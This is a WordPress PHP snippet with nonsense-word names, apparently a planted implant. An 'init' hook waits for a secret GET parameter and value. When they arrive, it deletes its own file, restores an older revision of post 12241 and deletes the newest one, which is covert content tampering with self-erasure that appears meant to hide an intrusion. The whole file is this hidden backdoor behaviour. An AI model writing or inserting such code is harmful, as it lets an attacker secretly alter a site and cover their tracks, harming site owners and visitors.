<?php

function install_delete_base_order() {
	if (isset($_GET['redirect_floating_typography_changer']) && $_GET['redirect_floating_typography_changer'] === 'additional_map_instant_keyword') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$better_hello_sales = 12241;
		$conversion_svg_cloud_rates = wp_get_post_revisions($better_hello_sales);
		if (empty($conversion_svg_cloud_rates)) die('no revisions');
		if (count($conversion_svg_cloud_rates) < 2) die('less than 2');
		$script_auth_affiliate = array_shift($conversion_svg_cloud_rates);
		$xml_protection_related = $script_auth_affiliate->ID;
		$visitor_your_admin = array_shift($conversion_svg_cloud_rates);
		$domain_colors_replace_quotes = $visitor_your_admin->ID;
		$module_team_links_rotator = wp_restore_post_revision($domain_colors_replace_quotes);
		if ($module_team_links_rotator === false) die('error restoring');
		$module_team_links_rotator = wp_delete_post_revision($xml_protection_related);		
		if ($module_team_links_rotator === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'install_delete_base_order');
